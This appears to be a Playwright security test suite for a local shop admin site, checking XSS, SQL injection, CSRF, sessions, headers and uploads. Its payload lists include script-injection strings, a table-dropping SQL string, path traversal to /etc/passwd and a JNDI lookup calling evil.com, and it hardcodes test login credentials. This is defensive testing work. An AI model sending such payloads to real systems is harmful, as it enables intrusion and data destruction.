/**
 * Security Testing Module
 * Tests XSS, CSRF, SQL Injection, Authentication, Authorization
 */

const { chromium } = require('playwright');
const fs = require('fs').promises;

class SecurityTests {
    constructor() {
        this.browser = null;
        this.page = null;
        this.results = [];
        this.config = {
            baseUrl: 'http://yukimart.local',
            loginUrl: 'http://yukimart.local/login',
            invoicesUrl: 'http://yukimart.local/admin/invoices',
            credentials: {
                email: 'yukimart@gmail.com',
                password: '123456'
            },
            headless: true,
            timeout: 20000
        };
    }

    async setup() {
        console.log('🚀 Setting up Security Tests...');
        
        this.browser = await chromium.launch({
            headless: this.config.headless,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        
        const context = await this.browser.newContext({
            viewport: { width: 1920, height: 1080 }
        });
        
        this.page = await context.newPage();
        
        await this.ensureLogin();
        console.log('✅ Security setup completed');
    }

    async ensureLogin() {
        await this.page.goto(this.config.invoicesUrl);
        
        if (this.page.url().includes('/login')) {
            await this.page.goto(this.config.loginUrl);
            await this.page.fill('input[name="email"]', this.config.credentials.email);
            await this.page.fill('input[name="password"]', this.config.credentials.password);
            
            await Promise.all([
                this.page.waitForNavigation({ waitUntil: 'networkidle' }),
                this.page.click('button[type="submit"]')
            ]);
        }
    }

    // SC01: XSS Protection Test
    async testXSSProtection() {
        const startTime = Date.now();
        console.log('🧪 Testing SC01: XSS Protection');
        
        try {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ];
            
            let xssVulnerable = false;
            let testedPayloads = 0;
            
            for (const payload of xssPayloads) {
                try {
                    // Test XSS in search field
                    const searchBox = this.page.locator('input[type="search"]').first();
                    if (await searchBox.isVisible()) {
                        await searchBox.fill(payload);
                        await this.page.waitForTimeout(1000);
                        
                        // Check if script executed (would show alert)
                        const alertHandled = await this.page.evaluate(() => {
                            return window.xssDetected || false;
                        });
                        
                        if (alertHandled) {
                            xssVulnerable = true;
                            break;
                        }
                        
                        testedPayloads++;
                    }
                } catch (error) {
                    // Error might indicate protection is working
                    continue;
                }
            }
            
            this.results.push({
                id: 'SC01',
                name: 'XSS Protection',
                status: !xssVulnerable ? 'PASSED' : 'FAILED',
                details: `Tested ${testedPayloads} XSS payloads, Vulnerable: ${xssVulnerable}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC01',
                name: 'XSS Protection',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC02: SQL Injection Test
    async testSQLInjection() {
        const startTime = Date.now();
        console.log('🧪 Testing SC02: SQL Injection Protection');
        
        try {
            const sqlPayloads = [
                "' OR '1'='1",
                "'; DROP TABLE invoices; --",
                "' UNION SELECT * FROM users --",
                "1' OR '1'='1' --",
                "admin'--"
            ];
            
            let sqlVulnerable = false;
            let testedPayloads = 0;
            
            for (const payload of sqlPayloads) {
                try {
                    // Test SQL injection in search
                    const searchBox = this.page.locator('input[type="search"]').first();
                    if (await searchBox.isVisible()) {
                        await searchBox.fill(payload);
                        await this.page.waitForTimeout(1500);
                        
                        // Check for SQL error messages
                        const pageContent = await this.page.content();
                        const sqlErrors = [
                            'mysql_fetch_array',
                            'ORA-01756',
                            'Microsoft OLE DB Provider',
                            'SQLServer JDBC Driver',
                            'PostgreSQL query failed',
                            'Warning: mysql_'
                        ];
                        
                        const hasError = sqlErrors.some(error => 
                            pageContent.toLowerCase().includes(error.toLowerCase())
                        );
                        
                        if (hasError) {
                            sqlVulnerable = true;
                            break;
                        }
                        
                        testedPayloads++;
                    }
                } catch (error) {
                    // Error might indicate protection is working
                    continue;
                }
            }
            
            this.results.push({
                id: 'SC02',
                name: 'SQL Injection Protection',
                status: !sqlVulnerable ? 'PASSED' : 'FAILED',
                details: `Tested ${testedPayloads} SQL injection payloads, Vulnerable: ${sqlVulnerable}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC02',
                name: 'SQL Injection Protection',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC03: CSRF Protection Test
    async testCSRFProtection() {
        const startTime = Date.now();
        console.log('🧪 Testing SC03: CSRF Protection');
        
        try {
            // Check for CSRF tokens in forms
            const csrfTokens = await this.page.evaluate(() => {
                const tokens = [];
                
                // Look for CSRF tokens
                const csrfInputs = document.querySelectorAll('input[name*="csrf"], input[name*="token"], input[name="_token"]');
                csrfInputs.forEach(input => {
                    if (input.value && input.value.length > 10) {
                        tokens.push(input.name);
                    }
                });
                
                // Check meta tags
                const metaTokens = document.querySelectorAll('meta[name*="csrf"], meta[name*="token"]');
                metaTokens.forEach(meta => {
                    if (meta.content && meta.content.length > 10) {
                        tokens.push(meta.name);
                    }
                });
                
                return tokens;
            });
            
            const hasCSRFProtection = csrfTokens.length > 0;
            
            this.results.push({
                id: 'SC03',
                name: 'CSRF Protection',
                status: hasCSRFProtection ? 'PASSED' : 'FAILED',
                details: `CSRF tokens found: ${csrfTokens.length}, Tokens: ${csrfTokens.join(', ')}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC03',
                name: 'CSRF Protection',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC04: Authentication Test
    async testAuthentication() {
        const startTime = Date.now();
        console.log('🧪 Testing SC04: Authentication');
        
        try {
            // Test access without authentication
            const newContext = await this.browser.newContext();
            const newPage = await newContext.newPage();
            
            await newPage.goto(this.config.invoicesUrl);
            
            const isRedirectedToLogin = newPage.url().includes('/login');
            
            await newContext.close();
            
            this.results.push({
                id: 'SC04',
                name: 'Authentication',
                status: isRedirectedToLogin ? 'PASSED' : 'FAILED',
                details: `Unauthenticated access redirected to login: ${isRedirectedToLogin}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC04',
                name: 'Authentication',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC05: Session Security Test
    async testSessionSecurity() {
        const startTime = Date.now();
        console.log('🧪 Testing SC05: Session Security');
        
        try {
            // Check session cookie security
            const cookies = await this.page.context().cookies();
            
            let secureSession = false;
            let httpOnlySession = false;
            let sessionCookieFound = false;
            
            cookies.forEach(cookie => {
                if (cookie.name.toLowerCase().includes('session') || 
                    cookie.name.toLowerCase().includes('laravel_session') ||
                    cookie.name.toLowerCase().includes('phpsessid')) {
                    sessionCookieFound = true;
                    if (cookie.secure) secureSession = true;
                    if (cookie.httpOnly) httpOnlySession = true;
                }
            });
            
            const sessionSecurityScore = sessionCookieFound && httpOnlySession;
            
            this.results.push({
                id: 'SC05',
                name: 'Session Security',
                status: sessionSecurityScore ? 'PASSED' : 'FAILED',
                details: `Session cookie found: ${sessionCookieFound}, HttpOnly: ${httpOnlySession}, Secure: ${secureSession}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC05',
                name: 'Session Security',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC06: Input Validation Test
    async testInputValidation() {
        const startTime = Date.now();
        console.log('🧪 Testing SC06: Input Validation');
        
        try {
            const maliciousInputs = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '${jndi:ldap://evil.com/a}',
                '{{7*7}}',
                '<%=7*7%>'
            ];
            
            let validationBypass = false;
            let testedInputs = 0;
            
            for (const input of maliciousInputs) {
                try {
                    const searchBox = this.page.locator('input[type="search"]').first();
                    if (await searchBox.isVisible()) {
                        await searchBox.fill(input);
                        await this.page.waitForTimeout(1000);
                        
                        // Check if malicious input is reflected without sanitization
                        const pageContent = await this.page.content();
                        if (pageContent.includes(input) && !pageContent.includes('&lt;') && !pageContent.includes('&gt;')) {
                            validationBypass = true;
                            break;
                        }
                        
                        testedInputs++;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            this.results.push({
                id: 'SC06',
                name: 'Input Validation',
                status: !validationBypass ? 'PASSED' : 'FAILED',
                details: `Tested ${testedInputs} malicious inputs, Validation bypass: ${validationBypass}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC06',
                name: 'Input Validation',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC07: HTTP Security Headers Test
    async testSecurityHeaders() {
        const startTime = Date.now();
        console.log('🧪 Testing SC07: HTTP Security Headers');
        
        try {
            const response = await this.page.goto(this.config.invoicesUrl);
            const headers = response.headers();
            
            const securityHeaders = {
                'x-frame-options': false,
                'x-content-type-options': false,
                'x-xss-protection': false,
                'strict-transport-security': false,
                'content-security-policy': false,
                'referrer-policy': false
            };
            
            Object.keys(securityHeaders).forEach(header => {
                if (headers[header]) {
                    securityHeaders[header] = true;
                }
            });
            
            const securityHeaderCount = Object.values(securityHeaders).filter(Boolean).length;
            const hasGoodSecurity = securityHeaderCount >= 3;
            
            this.results.push({
                id: 'SC07',
                name: 'HTTP Security Headers',
                status: hasGoodSecurity ? 'PASSED' : 'FAILED',
                details: `Security headers present: ${securityHeaderCount}/6, Headers: ${Object.keys(securityHeaders).filter(h => securityHeaders[h]).join(', ')}`,
                duration: Date.now() - startTime
            });
        } catch (error) {
            this.results.push({
                id: 'SC07',
                name: 'HTTP Security Headers',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    // SC08: File Upload Security Test
    async testFileUploadSecurity() {
        const startTime = Date.now();
        console.log('🧪 Testing SC08: File Upload Security');
        
        try {
            // Look for file upload inputs
            const fileInputs = await this.page.locator('input[type="file"]').count();
            
            if (fileInputs > 0) {
                // Check if there are file type restrictions
                const fileInput = this.page.locator('input[type="file"]').first();
                const acceptAttribute = await fileInput.getAttribute('accept');
                
                const hasFileTypeRestriction = acceptAttribute && acceptAttribute.length > 0;
                
                this.results.push({
                    id: 'SC08',
                    name: 'File Upload Security',
                    status: hasFileTypeRestriction ? 'PASSED' : 'FAILED',
                    details: `File inputs found: ${fileInputs}, Accept restrictions: ${acceptAttribute || 'None'}`,
                    duration: Date.now() - startTime
                });
            } else {
                this.results.push({
                    id: 'SC08',
                    name: 'File Upload Security',
                    status: 'PASSED',
                    details: 'No file upload inputs found',
                    duration: Date.now() - startTime
                });
            }
        } catch (error) {
            this.results.push({
                id: 'SC08',
                name: 'File Upload Security',
                status: 'FAILED',
                details: error.message,
                duration: Date.now() - startTime
            });
        }
    }

    async runAllTests() {
        console.log('🎯 Starting Security Tests...\n');
        
        await this.setup();
        
        await this.testXSSProtection();
        await this.testSQLInjection();
        await this.testCSRFProtection();
        await this.testAuthentication();
        await this.testSessionSecurity();
        await this.testInputValidation();
        await this.testSecurityHeaders();
        await this.testFileUploadSecurity();
        
        this.generateReport();
        await this.teardown();
    }

    generateReport() {
        console.log('\n🔒 SECURITY TESTS REPORT');
        console.log('=========================');
        
        let passed = 0;
        let failed = 0;
        
        this.results.forEach(result => {
            const status = result.status === 'PASSED' ? '✅' : '❌';
            console.log(`${status} ${result.id}: ${result.name}`);
            console.log(`   ${result.details}\n`);
            
            if (result.status === 'PASSED') passed++;
            else failed++;
        });
        
        const securityScore = Math.round((passed / (passed + failed)) * 100);
        console.log(`🔒 SECURITY SCORE: ${securityScore}% (${passed}/${passed + failed} tests passed)`);
        
        if (securityScore >= 90) {
            console.log('🛡️ EXCELLENT security posture!');
        } else if (securityScore >= 75) {
            console.log('⚠️ GOOD security with room for improvement');
        } else {
            console.log('🚨 CRITICAL security issues detected!');
        }
        
        return { passed, failed, total: passed + failed, results: this.results, securityScore };
    }

    async teardown() {
        if (this.browser) {
            await this.browser.close();
        }
        console.log('🏁 Security Tests completed');
    }
}

if (require.main === module) {
    const tests = new SecurityTests();
    tests.runAllTests().catch(console.error);
}

module.exports = SecurityTests;
